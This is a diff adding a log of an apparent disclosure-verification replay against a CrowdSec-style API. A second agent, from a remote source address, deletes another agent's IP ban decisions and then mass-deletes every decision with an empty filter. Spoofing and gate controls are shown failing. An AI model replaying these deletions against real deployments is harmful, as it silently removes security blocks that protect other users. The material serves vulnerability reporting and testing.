@@ -1,0 +1,48 @@
+===== H2 REPLAY on official release binaries =====
+version: v1.7.8-63227459
+Codename: alphaga
+-- logged in agentA (decision owner) and agentB (attacker, different machine)
+-- setup: agentA creates decisions for 192.0.2.200 and 192.0.2.201 via the profile path:
+   decision ids: 192.0.2.200 -> 7 ; 192.0.2.201 -> 8
+   bouncer view 192.0.2.200:
+[{"duration":"3h59m59s","id":7,"origin":"crowdsec","scenario":"test/manual","scope":"Ip","type":"ban","value":"192.0.2.200"}]
+   bouncer view 192.0.2.201:
+[{"duration":"3h59m59s","id":8,"origin":"crowdsec","scenario":"test/manual","scope":"Ip","type":"ban","value":"192.0.2.201"}]
+-- H2a: agentB (TOKB) REMOTE (src 127.0.0.2) DELETE /v1/decisions/7:
+HTTP 200
+{"nbDeleted":"1"}
+   bouncer view 192.0.2.200 after (expect null):
+null
+-- H2b: agentB (TOKB) REMOTE (src 127.0.0.2) DELETE /v1/decisions?value=192.0.2.201:
+HTTP 200
+{"nbDeleted":"1"}
+   bouncer view 192.0.2.201 after (expect null):
+null
+-- setup: fresh sacrificial alert from agentA (loopback):
+   alert id: 9
+-- ASYM: agentA (TOKA) REMOTE (src 127.0.0.2) DELETE /v1/alerts/9 (IP gate expected to BLOCK):
+HTTP 403
+{"message":"access forbidden from this IP (127.0.0.2)"}
+-- H12: same + X-Forwarded-For: 127.0.0.1 (spoof attempt):
+HTTP 403
+{"message":"access forbidden from this IP (127.0.0.2)"}
+-- ASYM control: agentA LOOPBACK DELETE /v1/alerts/9 (expect success):
+HTTP 200
+{"nbDeleted":"1"}
+===== non-loopback source attempt via VM LAN address 198.19.0.2 =====
+-- curl http://198.19.0.2:18080/health (hairpin to own LAN IP):
+
+HTTP 000
+-- curl --interface 198.19.0.2 http://127.0.0.1:18080/health (LAN source bind):
+
+HTTP 000
+-- conclusion recorded in VERIFICATION.md: sandbox external interface does not hairpin; 127.0.0.2 source-bind (above) is the faithful remote-peer path, as in the original disclosure.
+===== H2 nuclear: empty-filter DELETE /v1/decisions from REMOTE peer (agentB) =====
+-- active decisions before (bouncer view, full):
+[{"duration":"3h59m53s","id":4,"origin":"crowdsec","scenario":"test/manual","scope":"Ip","type":"ban","value":"198.51.100.23"},{"duration":"87599h59m53s","id":5,"origin":"capi","scenario":"test/manual","scope":"Ip","type":"ban","value":"203.0.113.99"},{"duration":"87599h59m53s","id":6,"origin":"cscli","scenario":"test/manual","scope":"Range","type":"ban","value":"0.0.0.0/0"}]
+-- agentB (TOKB), source-bound 127.0.0.2 (remote), DELETE /v1/decisions (NO filter):
+{"nbDeleted":"3"}
+HTTP 200
+-- active decisions after (bouncer view, expect null):
+null
+===== END H2 release replay =====
